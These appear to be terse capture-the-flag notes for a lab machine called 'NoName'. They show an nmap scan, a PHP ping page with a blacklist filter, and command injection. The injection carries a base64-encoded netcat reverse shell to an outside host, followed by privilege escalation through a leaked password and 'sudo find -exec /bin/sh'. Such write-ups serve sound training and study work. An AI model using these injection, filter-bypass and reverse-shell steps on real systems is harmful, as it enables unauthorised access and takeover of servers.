----------------------------------------------------
# Author -> Shubham Rannpise
----------------------------------------------------
# NoName
# 27/2/2023

----------------------------------------------------
# nmap result
----------------------------------------------------
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))

----------------------------------------------------
# dirb
----------------------------------------------------
http://192.168.110.15/superadmin.php
192.168.49.110 | id
192.168.49.110 | ls

->192.168.49.110 | cat superadmin.php
<?php
   if (isset($_POST['submitt']))
{
   	$word=array(";","&&","/","bin","&"," &&","ls","nc","dir","pwd");
   	$pinged=$_POST['pinger'];
   	$newStr = str_replace($word, "", $pinged);
   	if(strcmp($pinged, $newStr) == 0)
		{
		    $flag=1;
		}
       else
		{
		   $flag=0;
		}
}

if ($flag==1){
$outer=shell_exec("ping -c 3 $pinged");
echo "<pre>$outer</pre>";
}
?>

nc.traditional -e /bin/bash 192.168.49.110 1234
Let’s encode this to Base64 using base64encode.org
bmMudHJhZGl0aW9uYWwgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguNDkuMTEwIDQ0Mw==
ping 192.168.49.110 | 'echo "bmMudHJhZGl0aW9uYWwgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguNDkuMTEwIDQ0Mw==" | base64 -d'

192.168.49.110 | echo "bmMudHJhZGl0aW9uYWwgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguNDkuMTEwIDQ0Mw==" | base64 -d | bash


----------------------------------------------------
# priv esc
----------------------------------------------------
->find / -type f -user yash 2>/dev/null
/usr/share/hidden/.passwd

->cat /usr/share/hidden/.passwd
haclabs1234

su haclabs
Password: haclabs1234

->sudo -l
    (root) NOPASSWD: /usr/bin/find



    sudo find . -exec /bin/sh \; -quit
